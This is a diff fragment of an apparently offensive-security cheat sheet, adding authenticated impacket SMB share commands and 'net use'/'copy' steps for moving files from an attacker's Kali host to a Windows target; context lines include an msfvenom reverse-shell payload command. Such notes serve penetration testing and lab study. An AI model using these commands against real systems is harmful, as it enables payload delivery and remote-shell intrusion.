@@ -190,6 +190,12 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you d
 smbserver.py -smb2support Share .
 cmd.exe /c //<your kali IP>/Share/<file name you want>
 ````
+````
+/usr/local/bin/smbserver.py -username df -password df share . -smb2support
+net use \\<your kali IP>\share /u:df df
+copy \\<your kali IP>\share\<file wanted>
+````
+
 ### Windows http server
 ````
 python3 -m http.server 80
